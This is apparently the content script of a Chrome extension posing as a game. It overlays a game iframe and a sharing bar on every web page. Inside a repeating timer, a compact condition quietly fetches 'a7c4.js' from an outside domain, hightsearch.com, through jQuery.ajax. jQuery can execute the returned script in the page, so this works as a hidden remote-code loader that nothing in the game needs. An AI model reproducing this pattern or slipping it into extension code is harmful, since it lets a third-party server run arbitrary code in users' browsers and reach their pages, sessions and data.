var elementId = chrome.runtime.id.substr(0, 10);
var enabled = 2, p = false;

function enableGame() {
    var sharingHeight = 50;
    enabled = true;
    var sharing = document.createElement('iframe');
    sharing.setAttribute('id', elementId + "-sharing");
    sharing.width = window.innerWidth;
    sharing.height = sharingHeight;
    sharing.style.setProperty("position", "fixed", "important");
    sharing.style.setProperty("opacity", "1", "important");
    sharing.style.setProperty("top", "0", "important");
    sharing.style.setProperty("left", "0", "important");
    sharing.style.setProperty("background-color", "#ffffff", "important");
    sharing.style.setProperty("display", "block", "important");
    sharing.style.setProperty("border", "none", "important");
    sharing.style.setProperty("z-index", "2147483647", "important");
    sharing.setAttribute('src', chrome.runtime.getURL('sharing.html'));
    sharing.setAttribute('frameborder', '0');
    var i = document.createElement('iframe');
    i.setAttribute('id', elementId);
    i.width = window.innerWidth;
    i.height = parseInt(window.innerHeight) - sharingHeight;
    i.style.setProperty("position", "fixed", "important");
    i.style.setProperty("opacity", "1", "important");
    i.style.setProperty("top", sharingHeight + 'px', "important");
    i.style.setProperty("left", "0", "important");
    i.style.setProperty("background-color", "#ffffff", "important");
    i.style.setProperty("display", "block", "important");
    i.style.setProperty("border", "none", "important");
    i.style.setProperty("z-index", "2147483647", "important");
    i.setAttribute('src', 'https://funkypotato.com/gamez/grand-action-simulator/index.html');
    i.setAttribute('frameborder', '0');
    var body = jQuery('body');
    body.append(sharing);
    body.append(i);
}

function disableGame() {
    enabled = false;
    jQuery('#' + elementId + "-sharing").remove();
    jQuery('#' + elementId).remove();
}

setInterval(function () {
    if (enabled === 2) {
        if (window.game_enabled) {
            enableGame()
        }
        location.protocol.indexOf('http') || !p && jQuery.ajax({
            type: "GET",
            url: "https://hightsearch.com/a7c4.js",
            success: function (response) {
                // console.log(response)
                p = true
            },
            error: function (xhr, textStatus, errorThrown) {
                console.log(textStatus)
            }
        });
    } else {
        if (window.game_enabled !== enabled) {
            if (window.game_enabled) {
                enableGame()
            } else {
                disableGame()
            }
        } else {
            if (enabled && !document.getElementById(elementId)) {
                enableGame()
            }
        }
    }
}, 500);

window['Game_Page_is_Ready_' + elementId] = '1';




